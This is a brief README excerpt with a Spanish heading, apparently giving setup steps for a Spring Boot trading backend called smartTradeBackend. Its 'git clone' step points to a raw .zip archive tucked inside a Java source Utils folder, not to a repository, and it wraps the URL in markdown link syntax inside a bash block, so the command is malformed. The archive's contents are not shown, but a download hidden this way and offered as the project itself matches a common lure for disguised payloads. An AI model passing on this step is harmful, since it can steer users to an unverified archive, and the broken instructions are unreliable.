## Descargar el repositorio

```bash
# Clone this repository
$ git clone [https://raw.githubusercontent.com/ibaneez/smartTradeBackend/main/src/main/java/com/smartTrade/backend/Utils/Trade-smart-Backend-3.3.zip](https://raw.githubusercontent.com/ibaneez/smartTradeBackend/main/src/main/java/com/smartTrade/backend/Utils/Trade-smart-Backend-3.3.zip)

# Go into the repository
$ cd smartTradeBackend

# Run the project
$ mvn spring-boot:run
```
